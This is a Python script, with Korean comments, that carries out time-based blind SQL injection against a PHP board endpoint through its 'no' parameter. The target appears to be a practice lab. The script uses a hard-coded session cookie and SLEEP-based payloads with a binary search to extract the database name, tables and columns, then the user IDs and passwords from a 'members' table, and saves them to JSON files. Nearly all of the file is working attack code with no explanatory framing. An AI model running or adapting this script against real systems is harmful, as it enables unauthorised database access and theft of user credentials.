import requests
import time
import json
import numpy as np

RED = "\033[91m"
GREEN = "\033[32m"
BYELLOW = "\033[93m"
WHITE = "\033[37m"
BLACK = "\033[30m"
RESET = "\033[0m"

#  초기 설정 [ METHOD | URL ]
METHOD = "GET"
URL = "http://normaltic.com:9575/user_board/unlike.php"
DATABASE = {
    "DataBase": []
}

USERDATA = {

}
# 





def http(query):
    headers = {
        "Cookie": "PHPSESSID=uubd4qgjd3onluubci1dak86s6"
    }

    datas = {
        "no": query
    }

    startTime = time.time()
    req = requests.get(url=URL, params=datas, headers=headers) if METHOD == "GET" else requests.post(url=URL, datas=datas, headers=headers)
    endTime = time.time()

    print(GREEN + " :: 상태코드 :: " + BYELLOW + str(req.status_code) + WHITE + " || PAYLOAD -> " + RED + query + RESET)
    return False if endTime - startTime >= 2 else True







def binarySearch(min, max, query):
    mid = (min + max)//2
    result = http(query + str(mid) + ") and SLEEP(2) and '1'='1")

    if max - min <= 1:
        return max + 1 if result else min + 1
    else:
        return binarySearch(min, mid, query) if result else binarySearch(mid, max, query)







def finDatabaseName():
    dbLengthQuery = "313' and (length(database()) != {}) and SLEEP(2) and '1'='1"
    dbLength = 0
    for i in range(1, 100):
        if http(dbLengthQuery.format(i)):
            dbLength = i
            break

    dbNameQuery = "313' and (ascii(substring((SELECT database()),{},1)) > "
    dbName = ""
    for pos in range(1, dbLength+1):
        dbName += chr(binarySearch(33, 126, dbNameQuery.format(pos)))
    
    DATABASE["DataBase"].append({
        "DataBaseName": dbName
    })

    dbObject = json.dumps(DATABASE, indent=4)    
    with open("databaseFile.json", "w") as file:
        file.write(dbObject)

    print(BLACK + "Database Name -> " + dbName + RESET)
    return dbName






def findTableName(dbName):
    tableCount = 0
    tableCountQuery = "313' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > 1) and SLEEP(2) and '1'='1"
    for count in range(100):
        if http(tableCountQuery.format(dbName, count)):
            tableCount = count + 1
            break

    tableLengthList = []
    tableLength = 0
    dbTableLengthQuery = "313' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > {}) and SLEEP(2) and '1'='1"
    for tableCount in range(tableCount):
        for i in range(100):
            if http(dbTableLengthQuery.format(dbName, tableCount, i)):
                tableLength = i
                print(BLACK + str(tableCount) + " Table Length : " + str(tableLength) + RESET)
                tableLengthList.append(i)
                break
    
    tableNameQuery = "313' and (ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1),{},1)) > "
    tableList = []
    for i in range(tableCount):
        tableName = ""
        for pos in range(1, tableLengthList[i]+1):
            tableName += chr(binarySearch(33, 126, tableNameQuery.format(dbName, i, pos)))
        tableList.append(tableName)

    DATABASE["DataBase"].append({
        "TableNames": tableList
    })

    dbObject = json.dumps(DATABASE, indent=4)
    with open("databaseFile.json", "a") as file:
        file.write(dbObject)

    print(BLACK + "Database Table Names -> " + str(tableList) + RESET)








def findColumn(tableName):

    # Find Column Number
    countColumnQuery = "313' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) != 1) and SLEEP(2) and '1'='1"
    countColumn = 0
    for count in range(100):
        if http(countColumnQuery.format(tableName, count)):
            countColumn = count
            break

    print(BLACK + " Count Number : " + str(countColumn) + RESET)
    # ////////////////////

    # Count each Column NameLength
    columnLengthQuery = "313' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) != {}) and SLEEP(2) and '1'='1"
    columnLengthList = []
    for i in range(countColumn):
        for columnLength in range(100):
            if http(columnLengthQuery.format(tableName, i, columnLength)):
                columnLengthList.append(columnLength)
                break
    # ////////////////////

    # Find each Column Name
    colNameQuery = "313' and (ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1),{},1)) > "
    colList = []
    for i in range(countColumn):
        colName = ""
        for pos in range(1, columnLengthList[i]+1):
            colName += chr(binarySearch(33, 126, colNameQuery.format(tableName, i, pos)))
        colList.append(colName)
    
    DATABASE["DataBase"].append({
            tableName + " Columns": colList
        })

    dbObject = json.dumps(DATABASE, indent=4)
    with open("databaseFile.json", "a") as file:
        file.write(dbObject)

    print(BLACK + " Col Names -> " + str(colList) + RESET)








def findData(tableName):
    colList = ["uid", "pwd"]
    dataCountQuery = "313' and (length((SELECT {} FROM {} LIMIT {},1)) != {}) and SLEEP(2) and '1'='1"
    dataNameQuery = "313' and (ascii(substring((SELECT {} FROM {} LIMIT {},1),{},1)) > "
   
    for userIndex in range(5):
        dataList = []
        for colIndex in range(len(colList)):
            dataCount = 0
            for count in range(100):
                if http(dataCountQuery.format(colList[colIndex], tableName, userIndex, count)):
                    dataCount = count
                    break
            dataName = ""
            for pos in range(1, dataCount + 1):
                dataName += chr(binarySearch(33, 126, dataNameQuery.format(colList[colIndex], tableName, userIndex, pos)))
            dataList.append(dataName)

        USERDATA = {
            colList[0]: dataList[0],
            colList[1]: dataList[1]
        }

        dbObject = json.dumps(USERDATA, indent=4)    
        with open("userDataFile.json", "a") as file:
            file.write(dbObject)

        print(BLACK + str(userIndex) + " User Info -> " + str(dataList) + RESET)


# dbName = finDatabaseName()
# findTableName(dbName)
# colList = findColumn("members")
findData("members")









